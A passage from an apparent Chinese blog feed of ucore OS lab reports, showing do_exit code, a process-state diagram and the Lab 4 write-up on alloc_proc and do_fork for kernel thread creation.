<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// do_exit - called by sys_exit</span></span><br><span class="line"><span class="comment">//   1. call exit_mmap &amp; put_pgdir &amp; mm_destroy to free the almost all memory space of process</span></span><br><span class="line"><span class="comment">//   2. set process' state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself.</span></span><br><span class="line"><span class="comment">//   3. call scheduler to switch to other process</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_exit(<span class="keyword">int</span> error_code) &#123;</span><br><span class="line">    <span class="keyword">if</span> (current == idleproc) &#123;</span><br><span class="line">        panic(<span class="string">"idleproc exit.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (current == initproc) &#123;</span><br><span class="line">        panic(<span class="string">"initproc exit.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>) &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;state = PROC_ZOMBIE;<span class="comment">//进程停止</span></span><br><span class="line">    current-&gt;exit_code = error_code;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc = current-&gt;parent;</span><br><span class="line">        <span class="keyword">if</span> (proc-&gt;wait_state == WT_CHILD) &#123;</span><br><span class="line">            wakeup_proc(proc);<span class="comment">//唤醒父进程</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (current-&gt;cptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            proc = current-&gt;cptr;</span><br><span class="line">            current-&gt;cptr = proc-&gt;optr;</span><br><span class="line">    </span><br><span class="line">            proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                initproc-&gt;cptr-&gt;yptr = proc;</span><br><span class="line">            &#125;</span><br><span class="line">            proc-&gt;parent = initproc;</span><br><span class="line">            initproc-&gt;cptr = proc;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;</span><br><span class="line">                <span class="keyword">if</span> (initproc-&gt;wait_state == WT_CHILD) &#123;</span><br><span class="line">                    wakeup_proc(initproc);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    </span><br><span class="line">    schedule();</span><br><span class="line">    panic(<span class="string">"do_exit will not return!! %d.\n"</span>, current-&gt;pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<blockquote>
<p>请给出ucore中一个用户态进程的执行状态生命周期图（包执行状态，执行状态之间的变换关系，以及产生变换的事件或函数调用）。（字符方式画即可）</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">process</span> state       :     meaning               -- reason</span><br><span class="line">    PROC_UNINIT     :   uninitialized           -- alloc_proc</span><br><span class="line">    PROC_SLEEPING   :   sleeping                -- try_free_pages, do_wait, do_sleep</span><br><span class="line">    PROC_RUNNABLE   :   runnable(maybe <span class="built_in">running</span>) -- proc_init, wakeup_proc, </span><br><span class="line">    PROC_ZOMBIE     :   almost dead             -- do_exit</span><br><span class="line"> </span><br><span class="line">                                            RUNNING----------------+</span><br><span class="line">                                               A |                  |</span><br><span class="line">                                               | |                  |</span><br><span class="line">                                            proc_run()            <span class="built_in">exit</span>()  </span><br><span class="line">                                               | |                  |</span><br><span class="line">                                               | V                  V</span><br><span class="line">  alloc_page()--&gt; UNINIT --wakeup_proc()--&gt; RUNNABLE --<span class="built_in">exit</span>()--&gt; ZOMBIE</span><br><span class="line">                                               A                    A</span><br><span class="line">                                               |                    |</span><br><span class="line">                                           子进程<span class="built_in">exit</span>()            <span class="built_in">exit</span>()</span><br><span class="line">                                               |                    |</span><br><span class="line">                                               |                    |</span><br><span class="line">                                            SLEEPING----------------+</span><br></pre></td></tr></table></figure></div>
<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>本次实验是关于用户进程的实现，涉及到用户进程的切换和进程状态之间的转换过程，实验中最麻烦的一部分是练习0的修改代码部分，如果没有修改好代码，就会使得后面的make grade无法满分，并且会使虚拟机CPU飙升，甚至宕机。其次各个函数的执行逻辑较为复杂，感觉不太好分析。。。<br>总而言之，这次实验使我对进程控制块的章节内容有了更进一步的理解和掌握。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>uCoreOs lab4 实验报告</title>
    <url>/posts/50bc1597/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>了解内核线程创建/执行的管理过程</li>
<li>了解内核线程的切换和基本调度过程<a id="more"></a></li>
</ul>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><h2 id="练习0：填写已有实验"><a href="#练习0：填写已有实验" class="headerlink" title="练习0：填写已有实验"></a>练习0：填写已有实验</h2><p>本实验依赖实验1/2/3。请把你做的实验1/2/3的代码填入本实验中代码中有“LAB1”,“LAB2”,“LAB3”的注释相应部分。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">相对与实验三，实验四中主要改动如下：</span><br><span class="line">kern&#x2F;process&#x2F; （新增进程管理相关文件）</span><br><span class="line">proc.[ch]：新增：实现进程、线程相关功能，包括：创建进程&#x2F;线程，初始化进程&#x2F;线程，处理进程&#x2F;线程退出等功能</span><br><span class="line">entry.S：新增：内核线程入口函数kernel_thread_entry的实现</span><br><span class="line">switch.S：新增：上下文切换，利用堆栈保存、恢复进程上下文</span><br><span class="line">kern&#x2F;init&#x2F;</span><br><span class="line">init.c：修改：完成进程系统初始化，并在内核初始化后切入idle进程</span><br><span class="line">kern&#x2F;mm&#x2F; （基本上与本次实验没有太直接的联系，了解kmalloc和kfree如何使用即可）</span><br><span class="line">kmalloc.[ch]：新增：定义和实现了新的kmalloc&#x2F;kfree函数。具体实现是基于slab分配的简化算法 （只要求会调用这两个函数即可）</span><br><span class="line">memlayout.h：增加slab物理内存分配相关的定义与宏 （可不用理会）。</span><br><span class="line">pmm.[ch]：修改：在pmm.c中添加了调用kmalloc_init函数,取消了老的kmalloc&#x2F;kfree的实现；在pmm.h中取消了老的kmalloc&#x2F;kfree的定义</span><br><span class="line">swap.c：修改：取消了用于check的Line 185的执行</span><br><span class="line">vmm.c：修改：调用新的kmalloc&#x2F;kfree</span><br><span class="line">kern&#x2F;trap&#x2F;</span><br><span class="line">trapentry.S：增加了汇编写的函数forkrets，用于do_fork调用的返回处理。</span><br><span class="line">kern&#x2F;schedule&#x2F;</span><br><span class="line">sched.[ch]：新增：实现FIFO策略的进程调度</span><br><span class="line">kern&#x2F;libs</span><br><span class="line">rb_tree.[ch]：新增：实现红黑树，被slab分配的简化算法使用（可不用理会）</span><br></pre></td></tr></table></figure></div>
<p>将实验3的<code>kdebug.c、trap.c、default_pmm.c、pmm.c、vmm.c、swap_fifo.c</code>进行相应补充即可，并注意并非所有的不同都要替换掉，要根据上述改动考虑是否改动</p>
<h2 id="练习1：分配并初始化一个进程控制块"><a href="#练习1：分配并初始化一个进程控制块" class="headerlink" title="练习1：分配并初始化一个进程控制块"></a>练习1：分配并初始化一个进程控制块</h2><p>alloc_proc函数（位于kern/process/proc.c中）负责分配并返回一个新的struct proc_struct结构，用于存储新建立的内核线程的管理信息。ucore需要对这个结构进行最基本的初始化，你需要完成这个初始化过程。</p>
<p>【提示】在alloc_proc函数的实现中，需要初始化的proc_struct结构中的成员变量至少包括: state/pid/runs/kstack/need_resched/parent/mm/context/tf/cr3/flags/name。</p>
<p>请在实验报告中简要说明你的设计实现过程。请回答如下问题：</p>
<ul>
<li>请说明proc_struct中<code>struct context context</code>和<code>struct trapframe *tf</code>成员变量含义和在本实验中的作用是啥？（提示通过看代码和编程调试可以判断出来）</li>
</ul>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>所需要填写的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// alloc_proc - alloc a proc_struct and init all fields of proc_struct</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">alloc_proc</span>(<span class="title">void</span>) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">proc_struct</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE1 YOUR CODE</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * below fields in proc_struct need to be initialized</span></span><br><span class="line"><span class="comment">     *       enum proc_state state;                      // Process state</span></span><br><span class="line"><span class="comment">     *       int pid;                                    // Process ID</span></span><br><span class="line"><span class="comment">     *       int runs;                                   // the running times of Proces</span></span><br><span class="line"><span class="comment">     *       uintptr_t kstack;                           // Process kernel stack</span></span><br><span class="line"><span class="comment">     *       volatile bool need_resched;                 // bool value: need to be rescheduled to release CPU?</span></span><br><span class="line"><span class="comment">     *       struct proc_struct *parent;                 // the parent process</span></span><br><span class="line"><span class="comment">     *       struct mm_struct *mm;                       // Process's memory management field</span></span><br><span class="line"><span class="comment">     *       struct context context;                     // Switch here to run process</span></span><br><span class="line"><span class="comment">     *       struct trapframe *tf;                       // Trap frame for current interrupt</span></span><br><span class="line"><span class="comment">     *       uintptr_t cr3;                              // CR3 register: the base addr of Page Directroy Table(PDT)</span></span><br><span class="line"><span class="comment">     *       uint32_t flags;                             // Process flag</span></span><br><span class="line"><span class="comment">     *       char name[PROC_NAME_LEN + 1];               // Process name</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>查看proc.h各元素的定义说明</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __KERN_PROCESS_PROC_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERN_PROCESS_PROC_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;defs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;trap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memlayout.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// process's state in his life cycle</span></span><br><span class="line"><span class="keyword">enum</span> proc_state &#123;</span><br><span class="line">    PROC_UNINIT = <span class="number">0</span>,  <span class="comment">// uninitialized //未初始状态  </span></span><br><span class="line">    PROC_SLEEPING,    <span class="comment">// sleeping //睡眠（阻塞）状态</span></span><br><span class="line">    PROC_RUNNABLE,    <span class="comment">// runnable(maybe running) //运行与就绪态  </span></span><br><span class="line">    PROC_ZOMBIE,      <span class="comment">// almost dead, and wait parent proc to reclaim his resource //僵尸状态 </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don't need to save all the %fs etc. segment registers,</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Save all the regular registers so we don't need to care</span></span><br><span class="line"><span class="comment">// which are caller save, but not the return register %eax.</span></span><br><span class="line"><span class="comment">// (Not saving %eax just simplifies the switching code.)</span></span><br><span class="line"><span class="comment">// The layout of context must match code in switch.S.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebx;</span><br><span class="line">    <span class="keyword">uint32_t</span> ecx;</span><br><span class="line">    <span class="keyword">uint32_t</span> edx;</span><br><span class="line">    <span class="keyword">uint32_t</span> esi;</span><br><span class="line">    <span class="keyword">uint32_t</span> edi;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROC_NAME_LEN               15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PROCESS                 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PID                     (MAX_PROCESS * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">list_entry_t</span> proc_list;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> le2proc(le, member)         \</span></span><br><span class="line">    to_struct((le), struct proc_struct, member)</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">idleproc</span>, *<span class="title">initproc</span>, *<span class="title">current</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_run</span><span class="params">(struct proc_struct *proc)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_thread</span><span class="params">(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">uint32_t</span> clone_flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">set_proc_name</span><span class="params">(struct proc_struct *proc, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_proc_name</span><span class="params">(struct proc_struct *proc)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_idle</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((noreturn))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">struct proc_struct *<span class="title">find_proc</span><span class="params">(<span class="keyword">int</span> pid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">int</span> error_code)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__KERN_PROCESS_PROC_H__ */</span></span></span><br></pre></td></tr></table></figure></div>
<p>根据注释初始化进程结构体proc各元素即可</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// alloc_proc - alloc a proc_struct and init all fields of proc_struct</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">alloc_proc</span>(<span class="title">void</span>) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">proc_struct</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE1 YOUR CODE</span></span><br><span class="line">        proc-&gt;state = PROC_UNINIT; <span class="comment">// 进程状态 设置了进程的状态为“初始”态 这表示进程已经 “出生”了</span></span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>; <span class="comment">// 进程ID 设置进程pid的未初始化值 这表示进程的“身份证号”还没有办好</span></span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>; <span class="comment">// 刚刚初始化的进程 运行时间一定为零 </span></span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>; <span class="comment">// 为该进程分配的地址为0 因为还没有执行 也没有被重定位 因为默认地址都是从0开始的</span></span><br><span class="line">        proc-&gt;need_resched = <span class="literal">NULL</span>; <span class="comment">// 刚刚分配出来的进程 还未进入CPU 进程不能被调度</span></span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>; <span class="comment">// 父进程</span></span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>; <span class="comment">// 进程所用的虚拟内存</span></span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context)); <span class="comment">// 进程的上下文</span></span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>; <span class="comment">// 中断帧指针置空</span></span><br><span class="line">        proc-&gt;cr3 = boot_cr3; <span class="comment">// 页目录表地址 设为 内核页目录表基址 由于该内核线程在内核中运行</span></span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>; <span class="comment">// 标志位</span></span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;name), <span class="number">0</span>, PROC_NAME_LEN); <span class="comment">// 初始化进程名称为空</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h3><blockquote>
<p>请说明proc_struct中<code>struct context context</code>和<code>struct trapframe *tf</code>成员变量含义和在本实验中的作用是啥？（提示通过看代码和编程调试可以判断出来）</p>
</blockquote>
<p><code>context</code>对x86系统而言，进程/线程上下文就是CPU内部的一堆寄存器的信息。<br>其定义在kern/process/proc.h中：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebx;</span><br><span class="line">    <span class="keyword">uint32_t</span> ecx;</span><br><span class="line">    <span class="keyword">uint32_t</span> edx;</span><br><span class="line">    <span class="keyword">uint32_t</span> esi;</span><br><span class="line">    <span class="keyword">uint32_t</span> edi;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>trapframe *tf</code> 用于保存前一个被（中断或异常）打断的进程的状态信息。<br>其定义在kern/trap/trap.h中：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">/* below here defined by x86 hardware */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></div>
<h2 id="练习2：为新创建的内核线程分配资源"><a href="#练习2：为新创建的内核线程分配资源" class="headerlink" title="练习2：为新创建的内核线程分配资源"></a>练习2：为新创建的内核线程分配资源</h2><p>创建一个内核线程需要分配和设置好很多资源。kernel_thread函数通过调用<strong>do_fork</strong>函数完成具体内核线程的创建工作。do_kernel函数会调用alloc_proc函数来分配并初始化一个进程控制块，但alloc_proc只是找到了一小块内存用以记录进程的必要信息，并没有实际分配这些资源。ucore一般通过do_fork实际创建新的内核线程。do_fork的作用是，创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同。在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态。你需要完成在kern/process/proc.c中的do_fork函数中的处理过程。它的大致执行步骤包括：</p>
<ul>
<li>调用alloc_proc，首先获得一块用户信息块。</li>
<li>为进程分配一个内核栈。</li>
<li>复制原进程的内存管理信息到新进程（但内核线程不必做此事）</li>
<li>复制原进程上下文到新进程</li>
<li>将新进程添加到进程列表</li>
<li>唤醒新进程</li>
<li>返回新进程号</li>
</ul>
<p>请在实验报告中简要说明你的设计实现过程。请回答如下问题：</p>
<ul>
<li>请说明ucore是否做到给每个新fork的线程一个唯一的id？请说明你的分析和理由。</li>
</ul>
<h3 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h3><p>查看proc.c</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* do_fork -     parent process for a new child process</span></span><br><span class="line"><span class="comment"> * @clone_flags: used to guide how to clone the child process</span></span><br><span class="line"><span class="comment"> * @stack:       the parent's user stack pointer. if stack==0, It means to fork a kernel thread.</span></span><br><span class="line"><span class="comment"> * @tf:          the trapframe info, which will be copied to child process's proc-&gt;tf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE2 YOUR CODE</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Some Useful MACROs, Functions and DEFINEs, you can use them in below implementation.</span></span><br><span class="line"><span class="comment">     * MACROs or Functions:</span></span><br><span class="line"><span class="comment">     *   alloc_proc:   create a proc struct and init fields (lab4:exercise1)</span></span><br><span class="line"><span class="comment">     *   setup_kstack: alloc pages with size KSTACKPAGE as process kernel stack</span></span><br><span class="line"><span class="comment">     *   copy_mm:      process "proc" duplicate OR share process "current"'s mm according clone_flags</span></span><br><span class="line"><span class="comment">     *                 if clone_flags &amp; CLONE_VM, then "share" ; else "duplicate"</span></span><br><span class="line"><span class="comment">     *   copy_thread:  setup the trapframe on the  process's kernel stack top and</span></span><br><span class="line"><span class="comment">     *                 setup the kernel entry point and stack of process</span></span><br><span class="line"><span class="comment">     *   hash_proc:    add proc into proc hash_list</span></span><br><span class="line"><span class="comment">     *   get_pid:      alloc a unique pid for process</span></span><br><span class="line"><span class="comment">     *   wakup_proc:   set proc-&gt;state = PROC_RUNNABLE</span></span><br><span class="line"><span class="comment">     * VARIABLES:</span></span><br><span class="line"><span class="comment">     *   proc_list:    the process set's list</span></span><br><span class="line"><span class="comment">     *   nr_process:   the number of process set</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    1. call alloc_proc to allocate a proc_struct</span></span><br><span class="line">    <span class="comment">//    2. call setup_kstack to allocate a kernel stack for child process</span></span><br><span class="line">    <span class="comment">//    3. call copy_mm to dup OR share mm according clone_flag</span></span><br><span class="line">    <span class="comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span></span><br><span class="line">    <span class="comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span></span><br><span class="line">    <span class="comment">//    6. call wakup_proc to make the new child process RUNNABLE</span></span><br><span class="line">    <span class="comment">//    7. set ret vaule using child proc's pid</span></span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>根据提示写出代码有</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* do_fork -     parent process for a new child process</span></span><br><span class="line"><span class="comment"> * @clone_flags: used to guide how to clone the child process</span></span><br><span class="line"><span class="comment"> * @stack:       the parent's user stack pointer. if stack==0, It means to fork a kernel thread.</span></span><br><span class="line"><span class="comment"> * @tf:          the trapframe info, which will be copied to child process's proc-&gt;tf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC; <span class="comment">//尝试为进程分配内存</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span><span class="comment">//定义新进程</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;<span class="comment">//分配进程数大于4096,返回</span></span><br><span class="line">        <span class="keyword">goto</span> fork_out;<span class="comment">//返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM; <span class="comment">//因内存不足而分配失败</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//    1. call alloc_proc to allocate a proc_struct</span></span><br><span class="line">    proc = alloc_proc();</span><br><span class="line">    <span class="keyword">if</span> (!proc) &#123;<span class="comment">//申请内存块失败</span></span><br><span class="line">        <span class="keyword">goto</span> fork_out;<span class="comment">//返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;parent = current;<span class="comment">//设置父进程名字</span></span><br><span class="line">    <span class="comment">//    2. call setup_kstack to allocate a kernel stack for child process</span></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) ! = <span class="number">0</span>) &#123;<span class="comment">//分配内核栈</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;<span 